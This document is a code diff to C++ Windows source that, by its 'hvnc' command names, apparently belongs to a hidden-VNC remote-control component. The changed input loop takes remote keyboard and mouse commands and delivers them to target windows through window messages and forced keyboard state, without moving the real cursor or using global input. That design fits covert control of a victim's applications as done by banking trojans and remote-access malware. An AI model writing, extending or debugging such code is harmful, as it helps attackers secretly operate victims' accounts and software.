@@ -769,21 +769,28 @@ static DWORD mouse_button_flag(int btn, bool down) {
     return down ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP;
 }
 
-static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData = 0) {
-    INPUT input{};
-    input.type = INPUT_MOUSE;
-    input.mi.dx = normX;
-    input.mi.dy = normY;
-    input.mi.mouseData = mouseData;
-    input.mi.dwFlags = flags | MOUSEEVENTF_ABSOLUTE;
-    return SendInput(1, &input, sizeof(INPUT)) == 1;
-}
-
 static LPARAM key_lparam(WORD vk, bool keyUp) {
     UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
     LPARAM lp = 1 | (scan << 16);
+
+    // Check for extended keys
+    if (vk == VK_INSERT || vk == VK_DELETE || vk == VK_HOME || vk == VK_END ||
+        vk == VK_PRIOR  || vk == VK_NEXT   || vk == VK_LEFT || vk == VK_RIGHT ||
+        vk == VK_UP     || vk == VK_DOWN   || vk == VK_DIVIDE || vk == VK_RMENU ||
+        vk == VK_RCONTROL || vk == VK_LWIN || vk == VK_RWIN || vk == VK_APPS) {
+        lp |= 0x01000000;
+    }
+
     if (keyUp) lp |= 0xC0000000;
     return lp;
+}
+
+static void send_key_msg(HWND hwnd, WORD vk, bool down) {
+    if (!hwnd || !IsWindow(hwnd)) return;
+    UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
+    LPARAM lp = 1 | (scan << 16);
+    if (!down) lp |= 0xC0000000;
+    SendMessageW(hwnd, down ? WM_KEYDOWN : WM_KEYUP, vk, lp);
 }
 
 static void sync_keyboard_state(HWND hTarget, int lockState, int modifierState) {
@@ -791,50 +798,53 @@ static void sync_keyboard_state(HWND hTarget, int lockState, int modifierState) 
     DWORD targetThreadId = GetWindowThreadProcessId(hTarget, NULL);
     DWORD currentThreadId = GetCurrentThreadId();
 
-    BYTE remoteState[256];
     if (AttachThreadInput(currentThreadId, targetThreadId, TRUE)) {
+        BYTE remoteState[256];
         GetKeyboardState(remoteState);
 
-        // Lock states: bit 0: Caps, 1: Num, 2: Scroll
-        bool desiredCaps = (lockState & 0x01) != 0;
-        bool desiredNum = (lockState & 0x02) != 0;
+        bool currentCaps   = (remoteState[VK_CAPITAL] & 0x01) != 0;
+        bool desiredCaps   = (lockState & 0x01) != 0;
+        bool currentNum    = (remoteState[VK_NUMLOCK] & 0x01) != 0;
+        bool desiredNum    = (lockState & 0x02) != 0;
+        bool currentScroll = (remoteState[VK_SCROLL]  & 0x01) != 0;
         bool desiredScroll = (lockState & 0x04) != 0;
 
-        bool changed = false;
-        if (((remoteState[VK_CAPITAL] & 0x01) != 0) != desiredCaps) {
-            remoteState[VK_CAPITAL] = desiredCaps ? (remoteState[VK_CAPITAL] | 0x01) : (remoteState[VK_CAPITAL] & ~0x01);
-            changed = true;
-        }
-        if (((remoteState[VK_NUMLOCK] & 0x01) != 0) != desiredNum) {
-            remoteState[VK_NUMLOCK] = desiredNum ? (remoteState[VK_NUMLOCK] | 0x01) : (remoteState[VK_NUMLOCK] & ~0x01);
-            changed = true;
-        }
-        if (((remoteState[VK_SCROLL] & 0x01) != 0) != desiredScroll) {
-            remoteState[VK_SCROLL] = desiredScroll ? (remoteState[VK_SCROLL] | 0x01) : (remoteState[VK_SCROLL] & ~0x01);
-            changed = true;
-        }
-
-        // Modifiers: bit 0: Shift, 1: Ctrl, 2: Alt
+        bool currentShift = (remoteState[VK_SHIFT]   & 0x80) != 0;
         bool desiredShift = (modifierState & 0x01) != 0;
-        bool desiredCtrl = (modifierState & 0x02) != 0;
-        bool desiredAlt = (modifierState & 0x04) != 0;
+        bool currentCtrl  = (remoteState[VK_CONTROL] & 0x80) != 0;
+        bool desiredCtrl  = (modifierState & 0x02) != 0;
+        bool currentAlt   = (remoteState[VK_MENU]    & 0x80) != 0;
+        bool desiredAlt   = (modifierState & 0x04) != 0;
 
-        if (((remoteState[VK_SHIFT] & 0x80) != 0) != desiredShift) {
-            remoteState[VK_SHIFT] = desiredShift ? 0x80 : 0;
-            changed = true;
+        // Toggle Keys (Caps, Num, Scroll)
+        if (currentCaps != desiredCaps) {
+            PostMessageW(hTarget, WM_KEYDOWN, VK_CAPITAL, key_lparam(VK_CAPITAL, false));
+            PostMessageW(hTarget, WM_KEYUP, VK_CAPITAL, key_lparam(VK_CAPITAL, true));
         }
-        if (((remoteState[VK_CONTROL] & 0x80) != 0) != desiredCtrl) {
-            remoteState[VK_CONTROL] = desiredCtrl ? 0x80 : 0;
-            changed = true;
+        if (currentNum != desiredNum) {
+            PostMessageW(hTarget, WM_KEYDOWN, VK_NUMLOCK, key_lparam(VK_NUMLOCK, false));
+            PostMessageW(hTarget, WM_KEYUP, VK_NUMLOCK, key_lparam(VK_NUMLOCK, true));
         }
-        if (((remoteState[VK_MENU] & 0x80) != 0) != desiredAlt) {
-            remoteState[VK_MENU] = desiredAlt ? 0x80 : 0;
-            changed = true;
+        if (currentScroll != desiredScroll) {
+            PostMessageW(hTarget, WM_KEYDOWN, VK_SCROLL, key_lparam(VK_SCROLL, false));
+            PostMessageW(hTarget, WM_KEYUP, VK_SCROLL, key_lparam(VK_SCROLL, true));
         }
 
-        if (changed) {
-            SetKeyboardState(remoteState);
-        }
+        // Modifiers (Shift, Ctrl, Alt)
+        if (currentShift != desiredShift) send_key_msg(hTarget, VK_SHIFT,   desiredShift);
+        if (currentCtrl  != desiredCtrl)  send_key_msg(hTarget, VK_CONTROL, desiredCtrl);
+        if (currentAlt   != desiredAlt)   send_key_msg(hTarget, VK_MENU,    desiredAlt);
+
+        // Reinforce with SetKeyboardState
+        GetKeyboardState(remoteState);
+        remoteState[VK_CAPITAL] = desiredCaps   ? (remoteState[VK_CAPITAL] | 0x01) : (remoteState[VK_CAPITAL] & ~0x01);
+        remoteState[VK_NUMLOCK] = desiredNum    ? (remoteState[VK_NUMLOCK] | 0x01) : (remoteState[VK_NUMLOCK] & ~0x01);
+        remoteState[VK_SCROLL]  = desiredScroll ? (remoteState[VK_SCROLL]  | 0x01) : (remoteState[VK_SCROLL]  & ~0x01);
+        remoteState[VK_SHIFT]   = desiredShift  ? 0x80 : 0;
+        remoteState[VK_CONTROL] = desiredCtrl   ? 0x80 : 0;
+        remoteState[VK_MENU]    = desiredAlt    ? 0x80 : 0;
+        SetKeyboardState(remoteState);
+
         AttachThreadInput(currentThreadId, targetThreadId, FALSE);
     }
 }
@@ -986,11 +996,11 @@ static void input_loop() {
             sync_keyboard_state(hTarget, lockState, modifierState);
 
             if (action == "hvnc_keydown") {
-                PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
+                send_key_msg(hTarget, (WORD)vk, true);
             } else if (action == "hvnc_keyup") {
-                PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
+                send_key_msg(hTarget, (WORD)vk, false);
             } else if (action == "hvnc_char") {
-                PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
+                SendMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
             }
 
             g_forceFullFrame = true;
@@ -1008,8 +1018,6 @@ static void input_loop() {
             g_forceFullFrame = true;
             int lockState = cmd.value("lock_state", 0);
             int modifierState = cmd.value("modifier_state", 0);
-
-            send_mouse_input(normX, normY, MOUSEEVENTF_MOVE);
 
             HWND hwndUnderMouse = WindowFromPoint(screenPt);
             if (hwndUnderMouse) {
@@ -1053,6 +1061,10 @@ static void input_loop() {
                     LRESULT ht = HTCLIENT;
                     if (SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                           SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht)) {
+
+                        HWND hRoot = GetAncestor(hwnd, GA_ROOT);
+                        PostMessageW(hRoot, (ht == HTCLIENT) ? WM_MOUSEMOVE : WM_NCMOUSEMOVE, (WPARAM)ht, MAKELPARAM(screenPt.x, screenPt.y));
+
                         // Provide cursor feedback
                         SendMessageTimeoutW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, WM_MOUSEMOVE),
                                           SMTO_ABORTIFHUNG, 200, NULL);
@@ -1104,7 +1116,7 @@ static void input_loop() {
                     }
                 }
 
-                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, true));
+                PostMessageW(hRoot, mouseMsg == WM_LBUTTONDOWN ? WM_NCLBUTTONDOWN : (mouseMsg == WM_RBUTTONDOWN ? WM_NCRBUTTONDOWN : WM_NCMBUTTONDOWN), (WPARAM)ht, MAKELPARAM(screenPt.x, screenPt.y));
 
                 if (btn == 0 && (ht == HTCAPTION || ht == HTLEFT || ht == HTRIGHT ||
                                  ht == HTTOP || ht == HTBOTTOM || ht == HTTOPLEFT ||
@@ -1146,12 +1158,15 @@ static void input_loop() {
 
             sync_keyboard_state(hwnd, lockState, modifierState);
 
+            HWND hRoot = GetAncestor(hwnd, GA_ROOT);
             LRESULT ht = HTCLIENT;
             SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                 SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
 
             if (ht != HTCLIENT) {
-                send_mouse_input(normX, normY, MOUSEEVENTF_MOVE | mouse_button_flag(btn, false));
+                UINT msgUp = mouse_message_for_button(btn, false);
+                UINT ncMsgUp = (msgUp == WM_LBUTTONUP ? WM_NCLBUTTONUP : (msgUp == WM_RBUTTONUP ? WM_NCRBUTTONUP : WM_NCMBUTTONUP));
+                PostMessageW(hRoot, ncMsgUp, (WPARAM)ht, MAKELPARAM(screenPt.x, screenPt.y));
             } else {
                 HWND hTarget = g_mouseDownTarget[btn];
                 if (!hTarget || !IsWindow(hTarget)) hTarget = target_window_from_screen_point(screenPt);
@@ -1178,6 +1193,7 @@ static void input_loop() {
 
             sync_keyboard_state(hwnd, lockState, modifierState);
 
+            HWND hRoot = GetAncestor(hwnd, GA_ROOT);
             LRESULT ht = HTCLIENT;
             SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
                                 SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
@@ -1197,6 +1213,10 @@ static void input_loop() {
                 post_mouse_to_window(hTarget, screenPt, upMsg, mouse_wparam_for_button(btn, false));
                 post_mouse_to_window(hTarget, screenPt, dblMsg, mouse_wparam_for_button(btn, true));
                 post_mouse_to_window(hTarget, screenPt, upMsg, mouse_wparam_for_button(btn, false));
+            } else {
+                 UINT dblMsg = mouse_message_for_button(btn, true, btn == 0);
+                 UINT ncDblMsg = (dblMsg == WM_LBUTTONDBLCLK ? WM_NCLBUTTONDBLCLK : (dblMsg == WM_RBUTTONDBLCLK ? WM_NCRBUTTONDBLCLK : WM_NCMBUTTONDBLCLK));
+                 PostMessageW(hRoot, ncDblMsg, (WPARAM)ht, MAKELPARAM(screenPt.x, screenPt.y));
             }
             continue;
         }
